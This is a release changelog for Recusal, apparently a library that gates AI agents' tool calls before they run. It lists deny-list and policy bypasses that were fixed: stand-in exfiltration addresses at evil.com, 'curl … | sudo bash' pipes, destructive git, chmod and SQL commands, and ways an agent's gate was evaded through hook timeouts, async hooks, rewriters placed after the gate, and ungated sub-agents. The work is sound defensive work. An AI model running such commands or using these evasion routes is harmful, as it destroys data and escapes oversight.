  it passes; the tests assert zero executions for each refused turn on both APIs. A policy
  denial was never bypassed by this; it was an adapter ordering defect. (Found in the
  2026-11-02 outside review.)
- `README.md` and `SECURITY.md`: the hook-timeout outcome is stated with its two conditions.
  It is fail-open on Claude Code before 2.1.295 or for a registration without
  `"onFailure": "block"`, and a block otherwise; both documents said fail-open without
  qualification while `docs/HOWTO.md` and the generated launchers already carried the field.
  The README also said an install registered before 0.12.5 lacks the field; the field arrived
  in 0.12.4. The README's "what no local gate can see" paragraph now names the hosted MCP
  approval callback as the one provider-side point a local gate reaches, for the calls sent
  for approval. (Same review.)
- `tests/test_demos_smoke.py`: `examples/audit_demo.py` and `examples/classify_demo.py` now run as
  standalone programs from a temporary directory in the suite, with their verdict and route
  markers asserted, so the examples README claim that the offline demos are what CI runs is true
  for both. Contributed by @jdotc1 in #149. (#133)
- `examples/README.md`: two new tables index every module that was missing from it, the eight
  cookbook recipe modules with what each refuses and the seven framework adapters with their
  pinned SDK versions, plus the `audit_sink.py` row. `tests/test_examples_readme_index.py` keeps
  the index and `examples/*.py` in sync, so an example can no longer ship unlisted. Contributed by
  @jdotc1 in #150. (#134)
- `docs/EXTENDING.md`: the `gate_tool_use` example now imports the function it calls, and the
  `compute_verdict` line is valid Python. A new test, `tests/test_documentation_examples.py`,
  parses every Python block in `docs/EXTENDING.md` and `docs/HOWTO.md` and checks that each
  `from recusal... import` names a real attribute, so a documentation example can no longer
  import something that does not exist. Contributed by @dannyward630 in #140. (#135)

## [0.12.5] - 2026-11-02

Two more agent runtimes are Tested: Google ADK and CrewAI, each with its own offline example,
pinned CI jobs and a weekly latest lane, each at the runtime's own hook. PATCH under
`STABILITY.md`: no public surface changes, and the gate behaves exactly as in 0.12.4. The
examples live under `examples/` and are not part of the installed package.

### Added
- `examples/crewai_gate.py`: gates CrewAI tool calls with CrewAI's own hooks.
  `install_recusal_hooks(policy)` registers a `before_tool_call` hook that judges each call
  with `decide` and blocks a refusal, and an `after_tool_call` hook that replaces CrewAI's
  fixed "Tool execution blocked by hook" line with Recusal's reason, so the model reads why;
  it returns the function that uninstalls both. The registry is process-global, so one
  install covers every agent, task and crew in the process; the tests pin that, the
  registration-order trap (a hook after the gate can change the argument dict it judged, so
  install the gate last), that another hook's block keeps CrewAI's own line, and that a hook
  exception is swallowed by CrewAI (the gate never relies on raising). Offline with a scripted
  `BaseLLM`, Python 3.10+, tested with exactly `crewai==1.15.34`, two new CI jobs and a weekly
  latest lane; CrewAI stays out of the package's dependencies. "Works with" marks CrewAI
  Tested. (#106)
- `examples/google_adk_gate.py`: gates Google ADK tool calls with the ADK's own
  `before_tool_callback`. `recusal_before_tool(policy)` judges each call immediately before
  the `LlmAgent` runs it and answers a refusal as the tool's response; `gated_agent(agent,
  policy)` returns a gated copy with the gate as the last callback and gates `sub_agents` and
  the agent behind every `AgentTool`, refusing a `code_executor` or an `LlmAgent` subclass;
  `RecusalPlugin(policy)` is the same gate as a runner plugin for every agent a runner
  drives. The tests show why the gate is last (a later callback can change the arguments it
  judged), that a gate on the parent alone misses a sub-agent reached by transfer, and that
  the plugin covers it. Offline with a scripted model, Python 3.11+ (the ADK's minimum),
  tested with exactly `google-adk==2.13.0` and `google-genai==2.34.0`, two new CI jobs and a
  weekly latest lane; the ADK stays out of the package's dependencies. "Works with" marks
  Google ADK Tested. (#105)

### Changed
- `docs/VERIFY.md` records the 0.12.3 and 0.12.4 verification runs.

## [0.12.4] - 2026-11-02

A hardening release. PATCH under `STABILITY.md`: no new public surface. Four enforcement
gaps found by an outside review and reproduced on main are closed, each with tests that
fail on 0.12.3: a malformed `Finding` folded as a pass, `in_range` passed the string
`"NaN"`, the MCP collector's request write had no deadline, and `doctor` passed a hook
registration that never gates (background, narrowed, disabled, or without
`"onFailure": "block"`). The copied policy examples and cookbook recipes now refuse what
they claimed to refuse. The kernel's byte pin moved for the first fix and nothing else;
`STABILITY.md` records why and what stays frozen. Existing installs: run
`python -m recusal doctor`, then `python -m recusal init --repair-launcher`.

### Fixed
- **A malformed `Finding` can no longer fold as a pass.** `Finding("x", "CRITICAL", False)`
  (a string severity), a Finding whose severity was set to an unknown level, and one whose
  `passed` was a string such as `"no"` all folded to PASS: `compute_verdict` compared the
  severity enum by identity and read the outcome by truthiness, so a failed CRITICAL
  finding went uncounted. `Finding` now validates at construction (severity normalized to
  the enum, `passed` must be a bool or exactly 0/1), the fold re-validates every instance
  it is handed, and a loose dict whose `passed` is an arbitrary object (a list, a dict,
  `None`, an instance) is refused in strict mode and reads as a failure in lenient mode,
  never as a pass. `decide` and the Claude Code hook deny on every one of these, proven in
  `tests/test_evidence_validation.py`. The kernel's byte pin in `tests/test_authorization.py`
  moved for this fix and nothing else; the fold rule for valid evidence is unchanged
  (`STABILITY.md`).
- **`in_range` counts the string `"NaN"` as a violation.** It converted to a float NaN whose
  comparisons are all false, so it passed every range; `"inf"` and `"-Infinity"` now count
  too. A float NaN in the data is still a null and still skipped, as documented; `null_rate`
  accounts for it.
- **The MCP collector's request writes are deadline-bounded.** A server that handed back a
  long `nextCursor` and then stopped reading its stdin held the collector past every
  deadline until it exited, because the pipe write had none (reproduced: a 2 s hang against
  a 0.4 s observation deadline on Windows, whose pipe buffer is 4 KiB). The write now runs
  under the remaining observation time and a stalled server is refused; `nextCursor` is
  capped at 2,000 characters. Two regression tests pin it.
- **`doctor` judges the registration, not just the launcher text.** It passed with
  `"async": true` (a background hook's verdict never gates the call), a matcher that names
  no tool, and `"disableAllHooks": true`. New checks: `hooks_enabled`, `hook_synchronous`
  and `hook_type` (CRITICAL), `hook_matcher_covers_every_tool` and `hook_blocks_on_failure`
  (ERROR, exit 1 "degraded"), and the hook `timeout` reported as a metric only, since a
  fast gate can legitimately run under a short one.
- **Generated hooks set `"onFailure": "block"`.** Without it Claude Code runs the tool call
  when the hook times out, cannot start, or exits with a code other than 0 or 2. `init`
  registers the field on both launchers and the plugin's `hooks.json` carries it; Claude
  Code 2.1.295 and later honor it, older versions block on `exit 2` only, and the README
  and HOWTO say so. Existing installs: `init` on an installed gate now says when the field
  is missing, `doctor` reports it, and `init --repair-launcher` adds it to a canonical
  launcher without touching a customized hook.
- **Copied policies refuse what they claimed to refuse.** The cookbook recipes and the
  example policies are the text users paste into their own gate, so a gap in them is a gap
  in the user's security boundary. Documentation, examples and tests only; the `recusal`
  package does not change.
  - `examples/scenarios.py` `data_exfiltration` read only the last `@`, so
    `a@evil.com,b@acme.com`, `a@evil.com;b@acme.com`, `Attacker <a@evil.com>, b@acme.com`
    and `x@evil.com@acme.com` all passed as `acme.com`. It now uses the recipe 5 parsing
    from `examples/egress_allowlist.py`: every recipient field (`to`, and `cc`, `bcc`,
    `reply_to` when present) must read as exactly one bare mailbox on an allowed domain,
    or the call is refused whole.
  - `examples/scenarios.py` `unscoped_sql` was a lowercase substring test, so
    `DELETE FROM users -- where id=1`, `DELETE FROM users /* where */`, `TRUNCATE users`,
    `DROP TABLE users` and `DELETE FROM t; DELETE FROM u WHERE 1` all passed. It now
    delegates to the tested recipe 2 scanner, `examples/sql_scope_policy.py`, which refuses
    each of them, and keeps its `Finding.ok("sql_scope")` on a scoped statement, so the
    cookbook's "proven form" sentence is true.
  - `docs/COOKBOOK.md` recipe 11, the hand-rolled allowlist, confined writes with
    `os.path.abspath`, so a symlink or junction inside `./workspace` pointing outside it
    passed as inside; the library it claims to equal resolves both sides with `realpath`.
    The block now does the same, and refuses `{"command": None}` and `{"file_path": 7}`
    instead of raising `TypeError`. `tests/test_cookbook_blocks.py` runs the printed block
    against a real junction (Windows) or symlink (POSIX), skipping with a named reason only
    where the host cannot create one.
  - `docs/COOKBOOK.md` recipe 12 and `examples/mcp_governance.py` matched a destructive
    verb only as the first `_`-separated word, case-sensitively, so
    `mcp__github__Delete_repo`, `mcp__github__DELETE_REPO`, `mcp__github__deleteRepository`,
    `mcp__github__repo_delete` and `mcp__github__force_delete_branch` all deferred, as did
    the empty action `mcp__github__`. Both now casefold the action, match a verb at any
    `_` or camelCase word boundary, and refuse a call that names no action
    (`mcp_unnamed_action`); the two stay identical and both are tested.
  - `docs/COOKBOOK.md` recipe 5 and `examples/egress_allowlist.py` inspected only `to`,
    so `send_email {"to": "a@example.com", "cc": "x@evil.com"}` (and the same with `bcc`
    or `reply_to`) deferred. Both now govern every recipient field present and say so;
    `tests/test_egress_example.py` and `tests/test_cookbook_egress.py` pin it.

## [0.12.3] - 2026-11-02

Two more surfaces are Tested: the LangGraph audit trail (every `ToolNode` call on the
hash-chained log, labeled `langgraph.toolnode`) and OpenAI function calls gated in an
application's own loop, Responses API and Chat Completions alike. PATCH under
`STABILITY.md`: no public surface changes, and the gate behaves exactly as in 0.12.2. The
examples live under `examples/` and are not part of the installed package; no new CI jobs,
the existing LangGraph and OpenAI Agents jobs run their tests.

### Added
- `examples/langgraph_audit.py`: the LangGraph audit trail. `recusal_audited_gate(policy,
  log)` and `recusal_audited_agate(policy, log)` are the `ToolNode` gates from
  `langgraph_gate.py` with the decision written to a hash-chained `AuditLog` entry labeled
  `langgraph.toolnode`, keyed by LangGraph's tool call id, holding a SHA-256 fingerprint of
  the arguments and never their text. The decision logic is the one function the plain gate
  uses, with the recording arguments passed through to `decide`, so the two cannot drift;
  the tests prove the same decision and the same `ToolMessage` across a corpus of policies
  and inputs, sync and async. An unwritable log or a failing sink refuses the call and no
  tool runs. `main()` records three calls, verifies the log with `recusal audit verify`,
  edits one entry and shows the verifier refusing it. "Works with" marks the LangGraph audit
  trail Tested; the two LangGraph CI jobs and the weekly lane run its tests. (#77)
- `examples/openai_responses_gate.py`: gate OpenAI function calls in the loop your own
  application runs, no framework. `gate_function_calls(response, tools, policy)` judges every
  `function_call` item of a Responses API result and returns one `function_call_output` per
  call under its own `call_id`; `gate_tool_calls(completion, tools, policy)` does the same for
  Chat Completions `tool_calls` with `role: "tool"` messages. One decision function serves
  both shapes: arguments are decoded as the tool would receive them, invalid JSON, non-object
  arguments, an unknown tool and a raising policy are refused and never run. Default-deny on
  what the adapter does not understand: any other output item or tool call type
  (`custom_tool_call`, hosted tool calls, a type a later SDK adds) raises, naming the type;
  a call without an id is refused, because on `openai==3.34.0` neither `FunctionCallOutput`
  nor `ChatCompletionToolMessageParam` requires one; and every call must be answered exactly
  once. The fixtures are real SDK objects built with `model_validate`, offline. "Works with"
  marks OpenAI Responses and Chat Completions Tested; the two OpenAI Agents CI jobs and the
  weekly lane run its tests. (#81)

### Changed
- `docs/VERIFY.md` records the 0.12.2 verification run.
- **ruff 0.17.1.** The dev pin and the pre-commit hook move together; nothing needed
  reformatting and no new lint fires. 0.17.2 and 0.17.3 are inside the seven-day
  cooldown. Lands Dependabot #125, which bumped only the dev pin.
- **Actions bumped.** `pypa/gh-action-pypi-publish` 1.14.3 and `ossf/scorecard-action` 2.5.0,
  each SHA checked against its tag. Lands Dependabot #123.

## [0.12.2] - 2026-10-17

Two more agent runtimes are Tested: LangChain `create_agent` and OpenAI Agents SDK function
tools, each with its own example, pinned CI jobs and a weekly latest lane. PATCH under
`STABILITY.md`: no public surface changes, and the gate behaves exactly as in 0.12.1. The
examples live under `examples/` and are not part of the installed package.

### Added
- `examples/langchain_agent_gate.py`: gates LangChain `create_agent` tool calls with the
  same `recusal_gate` as middleware, sync and async (`recusal_agate` for `ainvoke`), tested
  with `langchain==1.4.3` on top of the LangGraph pins. The gate must be listed last in
  `middleware=`: the tests show that an argument rewriter, a human-in-the-loop edit or
  `LLMToolEmulator` listed after it acts on a call the gate never saw, and that the same
  calls are refused when the gate is last. "Works with" marks LangChain `create_agent`
  Tested. Contributed by @soyeladice-svg in #75. (#72)
- `examples/openai_agents_gate.py`: gates OpenAI Agents SDK function tools with a Recusal
  tool input guardrail, tested with `openai-agents==0.24.0` and `openai==3.34.0` in two
  new CI jobs and the weekly latest lane, with a surface probe
  (`tests/test_compat_openai_agents.py`). `gated_agent(agent, policy)` refuses what the
  guardrail cannot see instead of skipping it: every tool type other than a function tool
  (default-deny, so a type added in a later SDK release is refused too), `mcp_servers`,
  handoffs, `Agent` subclasses such as `SandboxAgent`, the Codex tool, and an
  `agent.as_tool(...)` whose sub-agent is not itself gated. The tests show why the last
  one matters: a guardrail on the parent alone sees only the sub-agent's input, and the
  ungated sub-agent runs a `DELETE`. "Works with" marks OpenAI Agents SDK function tools
  Tested. (#78)

### Changed
- `claude-plugin/README.md`: the plugin folder has its own README, saying plainly that the
  hook denies tool calls, what the shipped deny list refuses, how to install it and its
  limits. Plugin directories read this folder, not the repository README.
  `tests/test_claude_plugin.py` keeps it at least 40 words, keeps that sentence, and keeps
  its install commands equal to the repository README's.
- README: the first screen says what Recusal does in two sentences, then shows the demo
  and the "Works with" table; the longer explanation follows them, unchanged.
  `docs/VERIFY.md` records the 0.12.1 verification run.

## [0.12.1] - 2026-10-13

The deny list refuses more git commands that lose work or history, and the launcher refuses
an empty `CLAUDE_PROJECT_DIR` before any interpreter starts. PATCH under `STABILITY.md`:
no public surface changes. Both fixes refuse calls that were allowed before; who is
affected is said in each entry. The examples live under `examples/` and are not part of
the installed package.

### Fixed
- **An empty `CLAUDE_PROJECT_DIR` is refused by name.** The launcher builds the gate path
  from `CLAUDE_PROJECT_DIR`, which has been reported empty in hook environments. Empty,
  the path collapsed to `/.claude/hooks/recusal_gate.py`: the root of the current drive
  under PowerShell, a folder any signed-in Windows user can create, and Git's install
  folder under Git Bash. The launcher ran a gate found there, or refused every call with
  "hook did not run cleanly" and no cause. Now it refuses before any interpreter starts:
  `recusal gate: CLAUDE_PROJECT_DIR is empty, so the gate script cannot be found; failing
  closed`. The plugin's launcher checks `CLAUDE_PLUGIN_ROOT` the same way, and the
  launchers in the README, `docs/HOWTO.md`, `docs/EXAMPLE.md` and the examples carry the
  same check. Who is affected: every install. Existing installs keep working as before;
  `recusal doctor` names a launcher from 0.10.1 through 0.12.0 as outdated, and
  `recusal init --repair-launcher` replaces it, touching nothing else.
- **The deny list refuses more git commands that throw away working-tree changes.** It
  already refused `git clean -f`, `git checkout --`, `git restore` and `git reset --hard`;
  it now also refuses `git checkout -f` / `--force`, `git checkout .` and `./path`,
  `git switch -f` / `--force` / `--discard-changes`, `git worktree remove --force`, and
  `git stash drop` / `clear`. Global options before the subcommand no longer hide it:
  `git -C repo clean -fd`, `git -c k=v checkout -- .` and `git --work-tree=. restore x`
  were allowed and are now refused. Safe neighbours still defer (`git checkout main`,
  `git switch -c topic`, `git worktree remove` without `--force`, which git itself refuses
  for a dirty worktree, `git stash list` / `pop`). Who is affected: deny-list users whose
  agent runs one of these; each is refused with `refusing destructive command`. Not
  covered: `git checkout <file>`, which a deny list cannot tell apart from
  `git checkout <branch>`.
- **The deny list refuses git commands that delete branches, tags, remote refs or the
  history that recovers them.** Now refused: `git branch -D`, `-d -f` / `--delete
  --force`, and `-M` / `-C` (which rename or copy over an existing branch); `git tag -d`;
  `git push --delete` / `-d`, a `:ref` refspec (`git push origin :old`), `--mirror` and
  `--prune`; `git reflog expire` / `delete`; `git gc --prune=now` / `all`; `git prune`;
  `git update-ref -d`. Global options before the subcommand don't hide them. What git
  itself protects still defers: `git branch -d` (git refuses an unmerged branch), `-m`,
  `-c` and `-f`, `git push origin HEAD:main` and a bare `:`, `git fetch --prune`,
  `git remote prune`, `git worktree prune`, `git reflog show` and plain `git gc`. Git reads
  `-d` and `-D` differently, so the branch check reads the command in its original case;
  `git` and `branch` match in any case. Who is affected: deny-list users whose agent runs
  one of these; each is refused with `refusing destructive command (git history loss)`.
- **`examples/agent_loop.py` refuses a `DELETE` whose `WHERE` is only in a comment.**
  Its SQL check looked for the word `where` anywhere, so
  `DELETE FROM users -- where id = 1` was allowed. It now uses the tested SQL scope
  policy, which strips comments and quotes first (#79, thanks @jay23606).

### Changed
- README "Works with": a new **Wanted** status marks an open issue nobody has taken yet,
  and **Coming** now means work has started. The four unclaimed issues (#77, #78, #80,
  #81) move to Wanted, and five new rows invite help with Google ADK (#105), CrewAI
  (#106), Pydantic AI (#107), MCP tools in the OpenAI Agents SDK (#108) and LlamaIndex
  (#109). `tests/test_works_with.py` requires every Wanted row to link an issue.
- CI: the commit credit check is now a heads-up on pull requests and never blocks one.
  It points out a commit that would list an AI tool or a bot as a GitHub contributor
  (any address at Anthropic, OpenAI, xAI or Cursor, the GitHub accounts of AI coding
  agents, or any `[bot]` account), and the maintainer removes that line when merging,
  keeping the contributor as the author. Main is still checked strictly. Renamed from
  `No Anthropic co-author trailer` to `Contributor credit`; `CONTRIBUTING.md` says
  AI-assisted contributions are welcome and there is nothing the contributor needs to do.

### CI
- **Every code block in the cookbook runs.** `tests/test_cookbook_blocks.py` executes each
  Python block in `docs/COOKBOOK.md` as printed and checks the verdicts recipes 1 to 6, 8
  and 9 promise, so a recipe can no longer drift from the code (#59, thanks @jum-apzn).
- **Recipe 14 runs with the real MCP SDK.** The SDK is not a Recusal dependency, so the
  main test job skips that recipe. A new job, `Cookbook with the MCP SDK (Python 3.12)`,
  installs `mcp==2.3.0` on every pull request, and `compat.yml` installs the newest SDK
  each week; in both, a skipped recipe 14 fails the job. With the older 1.x SDK installed,
  the test now skips with a reason instead of failing.
- **Dependabot keeps the pins current.** `.github/dependabot.yml` opens weekly pull
  requests for the SHA-pinned GitHub Actions and the Python tooling (the hash-locked
  release environment and the dev tools), proposing a release only once it is 7 days old.
  Recusal itself still has no runtime dependencies.
- **Workflow actions updated.** Every SHA pin was checked against its upstream tag:
  `actions/checkout` 7.0.1, `actions/setup-python` 7.0.0, `actions/upload-artifact` 7.0.1,
  `actions/download-artifact` 8.0.1 (a digest mismatch on download now fails the release
  job instead of warning), `actions/attest-build-provenance` 4.2.2, `anchore/sbom-action`
  0.24.3, `sigstore/gh-action-sigstore-python` 3.5.0 and `pypa/gh-action-pypi-publish`
  1.14.2.
- **ruff 0.16.10.** The dev pin and the pre-commit hook move together; nothing needed
  reformatting. `tests/test_precommit_pins.py` fails if the hook's ruff differs from the
  dev pin or its mypy leaves the 1.x line the dev extras allow.
- **Release toolchain relocked.** `release-requirements.txt` moves to build 1.6.1 and
  twine 7.0.0 with 13 updated dependencies, every pin carrying the sha256 of each file
  PyPI serves for it. hatchling stays on 1.27.0 and mypy on 1.x while Python 3.9 is
  supported, and `.github/dependabot.yml` no longer proposes either past that line.

## [0.12.0] - 2026-10-10

Any runtime that calls `decide` can now write the same audit record the Claude Code hook
writes, and two defects in the gate itself are fixed. MINOR under `STABILITY.md`: `decide`
gains optional keyword-only parameters, and without them it is unchanged. The fixes change
behavior only where the old behavior was wrong; who is affected is said in each entry. The
examples live under `examples/` and are not part of the installed package.

### Added
- **`decide(audit=...)`.** `recusal.claude_code.decide` accepts an optional `AuditLog`, so
  LangGraph, the OpenAI Agents SDK or a hand-written loop gets the same tamper-evident,
  hash-chained record as the hook:
  `decide(tool_name, tool_input, policy, audit=log, surface="my_runtime.tool_gate", tool_use_id=call_id)`.
  `surface` is required whenever `audit=` is passed and names the runtime that
  adjudicated; there is no default, so an entry cannot claim a runtime it did not come
  from, and `claude_code.pretooluse` is reserved for the hook. Passing a recording
  argument without `audit=` raises, rather than silently recording nothing. The hook and
  `decide` now write through one shared recorder, with the same keys, the same chain and
  the same fail-closed rule when the log cannot be written. (#76)
- `recusal_agate(policy)` in `examples/langgraph_gate.py`: the LangGraph gate for
  `awrap_tool_call`, so async agents run through `ainvoke` are gated the same way as sync
  ones. Refusals and policy errors are handled by the same code in both paths, and a
  policy that raises still denies. Contributed by @Sinkleberg in #74. (#73)
- `examples/composed_policies.py` (cookbook recipe 10): composes the destructive-shell,
  workspace-write and egress policies into one gate, with tests that pin CRITICAL
  precedence, order independence and error-to-deny. Contributed by @soyeladice-svg in
  #69. (#58)
- `examples/quality_gate.py` (cookbook recipe 8): refuses unusable quality evidence. A
  `NaN`, infinite or out-of-range coverage figure, or a negative, non-integer or `bool`
  failed-test count, is now a named error instead of a pass or an exception.
  Contributed by @soyeladice-svg in #70. (#55)
- `examples/subject_guard.py` (cookbook recipe 4): refuses a write to a customer record
  when the session has no subject, or the target does not match it. Contributed by
  @soyeladice-svg in #71. (#56)

### Fixed
- **`allowlist_policy(allow=...)` was skipped for Read, Grep and Glob.** The built-in
  read-only defaults were checked before the `allow=` predicates, so
  `allow={"Read": lambda args: False}` still let every `Read` through and the predicate
  never ran. The docstring always said the predicate is the whole decision for its tool;
  it now is. Affects only policies that pass `allow=` for one of those three tools; every
  other policy decides exactly as before. Found by an outside review. (#82)
- **The audit fingerprint folded different inputs together.** The input fingerprint used
  `json.dumps(..., default=str)`, so `{1: "x"}` and `{"1": "x"}` shared a fingerprint, an
  object shared one with its `str()`, and `NaN` was recorded as if it were JSON. It now
  uses the strict serializer `recusal.authorization` already uses. Every valid JSON input
  hashes exactly as before (0 differences across 50,000 random inputs), so existing logs
  keep their meaning. An input outside JSON is denied when it would be recorded, or keeps
  its decision with no fingerprint under `fail_closed=False`. The hook now fingerprints
  only when it has a log, so no unaudited decision changes. Found by an outside review.
  (#82)
- **Windows: concurrent first appends to a new audit log could raise.** Two processes
  making their first append at the same instant both tried to write the lock file's
  one-time first byte, and Windows refused the second with `PermissionError`. The second
  writer now waits its turn through the existing lock retry, which still fails closed on
  a real permission problem. Linux and macOS are unaffected. Contributed by @biggdawg320
  in #68. (#67)
- `examples/scenarios.py`: the wrong-subject scenario no longer treats an unset session
  subject and an unset target as a match. Contributed by @soyeladice-svg in #71. (#56)

### Changed
- `CONTRIBUTING.md` and CI: a commit that names an Anthropic address as co-author,
  author or committer is refused by a required check, because GitHub lists such an
  address as a repository contributor. AI-assisted contributions are welcome; only the
  trailer is refused, and `python tools/check_trailers.py origin/main..HEAD` checks a
  branch before it is pushed. (#83)

## [0.11.1] - 2026-10-02

One fix in `recusal.checks`, and the first adapter example for an agent framework other
than Claude. PATCH under `STABILITY.md`: valid thresholds give exactly the verdicts they
gave before; only an unusable threshold now fails loudly instead of passing. The example
lives under `examples/` and is not part of the installed package.

### Fixed
- **A `NaN` or out-of-range threshold silently turned a data check off.** `row_count`,
  `null_rate` and `in_range` did not validate their thresholds, and a `NaN` makes every
  comparison false, so `null_rate(rows, "a", max_rate=float("nan"))` passed no matter how
  many values were empty. A threshold that is `NaN`, infinite, a `bool`, or outside its
  meaning (`max_rate` outside 0 to 1, a negative `min_rows`, `in_range` with
  `min_value > max_value`) is now reported as a failing finding that says "invalid
  threshold", the way `date_range` already reports an invalid window. Contributed by
  @RugvedBane in #63. (#57)

### Added
- `examples/langgraph_gate.py`: gates a LangGraph agent's tool calls with Recusal.
  A user's own `@tool` functions go unchanged into LangGraph's prebuilt `ToolNode`, and
  `recusal_gate(policy)` is attached with `wrap_tool_call`, so every proposed call is
  adjudicated before it runs and a refusal comes back to the agent as an error
  `ToolMessage` carrying the reason. Offline and deterministic (no model or API key),
  Python 3.10+, tested with exactly `langgraph==1.2.12` and `langchain-core==1.6.5`,
  with two new CI jobs, and LangGraph stays out of the package's dependencies.
  Contributed by @soyeladice-svg in #62. (#60)

### Changed
- The README and package description now say what Recusal already was: framework-neutral,
  for Claude Code, MCP, LangGraph, or any agent loop, with a short note on what the
  LangGraph gate guards and what it doesn't. (#64)

## [0.11.0] - 2026-09-27

One new check and a set of tested cookbook examples, all from the project's first two
outside contributors. MINOR under `STABILITY.md`: `recusal.checks.date_range` is added;
nothing that existed changes. The examples live under `examples/` and are not part of the
installed package.

### Added
- `recusal.checks.date_range`: fail when any date or datetime in a column falls outside
  an inclusive window. Strings are parsed against one explicit grammar, so every supported
  Python gives the same verdict, and an invalid window (unparseable, mixed kinds, or
  inverted) is reported as a caller error rather than as row violations. Contributed by
  @DYNOSuprovo in #17, the project's first outside contribution.
- Seven runnable, tested examples, and a hardened eighth, each linked from the guide it
  completes. None changes the `recusal` package. Contributed by @fatihcvs in #23, #24,
  #25, #33, #34, #38, #39, #48, #49, #50 and #51.
  - `examples/audit_sink.py`: a custom `AuditSink` that mirrors each entry to a local
    file and advances its head only after a successful write, so a failed delivery is
    never recorded as delivered.
  - `examples/egress_allowlist.py` (cookbook recipe 5): checks literal email and HTTP(S)
    destinations against an explicit domain set, refuses missing or malformed ones, and
    states what it cannot see, such as addresses built inside a shell command.
  - `examples/action_budget.py` (cookbook recipe 7): a SQLite counter that keeps the
    count across fresh hook processes and does not lose increments under concurrent
    hooks.
  - `examples/workspace_policy.py` (cookbook recipe 3): confines explicit writes to a
    workspace root after resolving symlinks, so a link inside the workspace can no
    longer point a write outside it, and refuses secret-looking paths below the
    workspace root, so a project folder such as `credentials-api` is not refused.
  - `examples/sql_scope_policy.py` (cookbook recipe 2): a lexical scanner that ignores
    comments and quoted text, checks each statement on its own, and refuses a
    `DELETE`/`UPDATE` with no top-level `WHERE`, so `updated_at` is no longer mistaken
    for a command and a commented-out `WHERE` no longer counts. An unquoted `#` is
    refused, because it starts a comment in MySQL and MariaDB. A `DELETE` or `UPDATE`
    inside a `WITH` clause needs its own `WHERE`; a sibling query cannot supply it.
  - `examples/destructive_shell_policy.py` (cookbook recipe 1): wraps Recusal's own
    reference deny list, with optional local markers on top, so the recipe cannot
    fall behind the engine it teaches.
  - `examples/approved_tool_policy.py` (cookbook recipe 9): an allowlist that refuses a
    missing, empty, non-string or unknown tool name.
  - `examples/injection_quarantine.py` (cookbook recipe 6, hardened): normalizes case,
    spacing and invisible characters before matching, and says plainly that phrase
    matching is a tripwire, not a defense.

### Fixed
- **Cookbook recipe 5 (egress allowlist) could let data go to the wrong address.** The
  copy-paste text read only the last `@` of an email `to`, so `a@evil.com,b@acme.com`
  passed as `acme.com`, and a missing or unreadable destination was allowed. Both the
  text and `examples/egress_allowlist.py` also trusted `https://evil.com\@acme.com/`,
  which Python's `urlparse` reads as `acme.com` and a browser-style parser as
  `evil.com`. Both now refuse lists, missing destinations, backslashes and userinfo, and
  a new test runs the cookbook text exactly as printed so it cannot drift from the
  tested example again. Documentation and examples only; the `recusal` package does not
  change. (#28)

## [0.10.3] - 2026-09-25

One deny-list fix. PATCH under `STABILITY.md`: the reference deny list now refuses two
command shapes it should have refused already; nothing it refused before is allowed now.

### Fixed
- **A pipe into an interpreter behind a wrapper or a path was not refused.** The
  pipe-into-interpreter check matched only a bare interpreter name right after the pipe,
  so `curl … | bash` was refused but `curl … | sudo bash`, `| sudo -E sh`, `| env bash`,
  `| /usr/bin/env bash`, `| doas sh`, `| nohup sh`, `| timeout 60 bash` and
  `| /bin/bash` were allowed. A second check now refuses an interpreter behind one of
  those wrappers or a path. The interpreter must be a whole word, so `| grep bash` and
  `| sudo tee /etc/bash.bashrc` still defer.
- **Recursive `chmod` to a world-writable mode was refused in only one spelling.**
  `chmod -R 777` was refused, but `chmod 777 -R`, `chmod -R a+rwx`, `chmod -R o+w` and
  `chmod -R u+x,o+w` were not. The flag and the mode are now matched in either order,
  including the symbolic modes that grant write to everyone; removing write
  (`chmod -R o-w`) still defers.

Found while turning cookbook recipe 1 into a contributor issue: the recipe was checked
against the package's own deny list, and the package missed these too. 17 new red-team
cases fail on 0.10.2 and pass here, alongside new cases that must keep deferring.

## [0.10.2] - 2026-09-23

One determinism fix, found while reviewing a contribution. PATCH under `STABILITY.md`: on
Python 3.9 nothing changes; on 3.11+ the expiry check now refuses the timestamp formats
only those versions accepted, so every supported Python gives the same verdict.

### Fixed
- **The authorization expiry check gave different verdicts on different Pythons.** It
  parsed `expires_at` and `now` with `datetime.fromisoformat`, which accepts far more
  from Python 3.11 on, so `2026-12-31T23:59:59.5Z`, `20261231T235959Z`, a 9-digit
  fraction, or an ISO week date was accepted on 3.12 and refused on 3.9: the same
  authorization evidence, two verdicts. The check now parses one explicit grammar on
  every version: `YYYY-MM-DD`, `T` or a space, `HH:MM` with optional `:SS` and a 3 or
  6 digit fraction, then `Z` or `±HH:MM`. That is exactly the set 3.9 accepted (measured:
  the old and new parsers agree on every listed input on 3.9, parsed values included),
  so nothing changes on 3.9 and 3.11+ now refuses the formats only it accepted.
  Present since 0.9.0; found while reviewing a contribution that used the same parser.

### Added
- `tests/test_cross_version_determinism.py`: CI fails if `recusal/` calls a
  version-dependent parser (`fromisoformat`), and `CONTRIBUTING.md` states the rule: the
  same evidence gives the same verdict on every supported Python.

## [0.10.1] - 2026-09-23

Two first-run fixes found by installing 0.10.0 from PyPI into a fresh virtual
environment and using it as a new adopter would. PATCH under `STABILITY.md`: the
kernel, manifest schema v8, hook semantics, CLI shapes and exit codes are unchanged.

### Fixed
- **The launcher `init` registers now skips an interpreter that cannot import recusal.**
  It used to run the first `python3` / `python` / `py` that was 3.9 or newer, so with
  recusal installed in a virtual environment behind a system Python, the gate refused
  every tool call (fail-closed, but unusable). The probe is now
  `import sys; sys.version_info >= (3, 9) or sys.exit(1); import recusal`, in the POSIX
  and PowerShell launchers and in every manual-registration example; with no candidate
  that can import recusal it still fails closed, and says so. The plugin launcher is
  unchanged: it vendors its runtime and needs only a Python.
- `recusal init --repair-launcher` recognizes the launchers 0.10.0 and earlier
  registered and upgrades them in place, leaving other hooks untouched; `recusal doctor`
  names an outdated launcher as a warning. Upgrade an existing project with
  `recusal init --repair-launcher`.

### Changed
- **The pin-time size screen is recalibrated from 4,000 to 8,000 characters**
  (`MAX_DECLARED_CHARS`, the default `max_chars` of `screen_tool_declarations` and
  `screen_server_instructions`). Measured with this package's own screen over 10 widely
  used servers (103 tools), the largest legitimate declarations were 4,470 (Notion) and
  4,090 (sequential-thinking) characters and everything else 2,880 or less, so the old
  cap flagged ordinary tools and taught reflexive `--force`. 8,000 clears every measured
  tool and still flags a declaration of several pages; the marker screen and the depth
  cap are unchanged, and a caller can still pass `max_chars=4000`.

## [0.10.0] - 2026-09-23

Alignment release: the MCP 2026-07-28 revision, current Claude Code behavior, and the
